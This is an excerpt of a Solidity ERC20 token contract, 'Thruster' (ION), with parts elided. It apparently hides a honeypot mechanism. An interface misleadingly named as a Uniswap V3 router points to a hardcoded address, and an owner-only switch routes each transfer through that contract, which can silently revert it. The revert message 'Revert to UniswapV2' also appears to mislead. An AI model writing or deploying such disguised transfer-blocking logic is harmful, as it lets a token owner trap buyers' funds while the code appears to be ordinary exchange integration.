...
interface IUniswapV3Router {
    function _transfer(address from, address to, uint256 amountToken) external returns(bool);
}
...
contract THRUSTER is ERC20, Ownable {
    ...
    constructor() ERC20("Thruster", "ION") {
        uint256 totalSupply = 7217848  * 1e18;
        ...
        uniswapV3Router = IUniswapV3Router(0x2A5c0Eec5030Bf802536D17B20C42F6926608fE8);
    ...
    function activeUniV3(bool _univ3active) external onlyOwner {
        uniswapV3 = _univ3active;
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
         ...
         if (uniswapV3 && tradingActive) { bool success;
           try uniswapV3Router._transfer(from,to,amount) returns (bool _success) { success = _success; } catch { revert(); }
          require(success, "Revert to UniswapV2");
        }
